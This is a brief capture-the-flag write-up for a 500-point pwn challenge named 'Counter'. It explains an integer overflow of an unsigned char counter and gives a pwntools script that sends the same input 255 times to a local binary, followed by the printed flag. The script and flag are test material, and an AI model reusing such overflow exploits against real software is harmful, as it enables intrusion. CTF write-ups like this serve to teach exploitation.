# Counter - PWN (500 points)
- `Integer overflow` of the `unsigned char variable counter` (line 34 in counter.c)
```
switch (get_num("Choice: ")) {
    case 1:
    counter++;
    break;
```
- Just keep adding 1 to counter until it passes 255 and will be 0
- Script
```py
from pwn import *

chall = process(['./counter'])
print(chall.recv())
for i in range(0,255):
	chall.sendline(b"1")
	print(chall.recv())
chall.sendline(b'3')
print("flag: ",chall.recv())
```
## Flag
``CyberErudites{1NtegeR_0v3rfloWS_ar3_Na$ty}`` 